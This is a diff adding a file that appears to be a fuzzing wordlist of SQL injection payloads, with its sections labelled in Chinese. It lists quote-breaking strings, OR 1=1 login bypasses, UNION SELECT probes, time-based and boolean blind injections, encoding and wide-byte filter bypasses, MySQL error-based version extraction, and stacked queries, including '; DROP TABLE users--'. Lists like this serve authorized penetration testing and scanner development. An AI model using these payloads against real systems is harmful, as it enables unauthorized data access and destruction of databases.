@@ -1,0 +1,155 @@
+# SQL注入测试Payload
+# 基础测试（单引号）
+'
+')
+'))
+'--
+'#
+
+# 基础测试（双引号）
+"
+")
+"))
+"--
+"#
+
+# 逻辑测试（单引号）
+' OR '1'='1
+' OR 1=1--
+' OR 'a'='a
+admin' OR '1'='1
+' OR '1'='1'--
+' OR 1=1#
+
+# 逻辑测试（双引号）
+" OR "1"="1
+" OR 1=1--
+" OR "a"="a
+admin" OR "1"="1
+" OR "1"="1"--
+" OR 1=1#
+
+# 混合引号测试
+'OR"1"="1
+"OR'1'='1
+'\""
+"\'
+
+# 注释符测试
+'/*
+"/*
+'/**/
+"/**/
+
+# UNION测试
+' UNION SELECT NULL--
+" UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+" UNION SELECT NULL,NULL--
+
+# 错误注入
+'||'1
+"||"1
+'''
+"""
+''''
+""""
+
+# 特殊字符
+'\"%df
+sb'='\"=\"
+#{xx}
+#xx}
+
+# 数字型注入
+1 OR 1=1
+1' OR '1'='1
+1" OR "1"="1
+-1
+999999
+0
+1/1
+1*1
+
+# 时间盲注（谨慎使用）
+' AND SLEEP(3)--
+" AND SLEEP(3)--
+'; WAITFOR DELAY '0:0:3'--
+"; WAITFOR DELAY '0:0:3'--
+' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
+" AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
+
+# 布尔盲注
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
+
+# 堆叠查询
+'; DROP TABLE users--
+"; DROP TABLE users--
+'; SELECT SLEEP(3)--
+"; SELECT SLEEP(3)--
+
+# 编码绕过
+%27
+%22
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+
+# 宽字节注入
+%df'
+%df"
+%bf'
+%bf"
+
+# 转义绕过
+\'
+\"
+\\'
+\\"
+\\\'
+\\\"
+admin\\'--
+admin\\"--
+
+# 二次注入
+admin'--
+admin"--
+test'--
+test"--
+
+# NULL值测试
+null
+NULL
+(null)
+(NULL)
+
+# 长字符串测试（溢出）
+åååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååååå
+
+# 特殊函数（MySQL报错注入）
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+" AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
+" AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
+
+# 数据库指纹识别
+' AND @@version--
+" AND @@version--
+' AND version()--
+" AND version()--
+
+# 多语句注入（堆叠查询）
+'; SELECT 1--
+"; SELECT 1--
+'; SELECT * FROM users--
+"; SELECT * FROM users--
+
+# 注释符变体
+'/**/OR/**/1=1--
+"/**/OR/**/1=1--
+'--+
+"--+
+'%23
+"%23
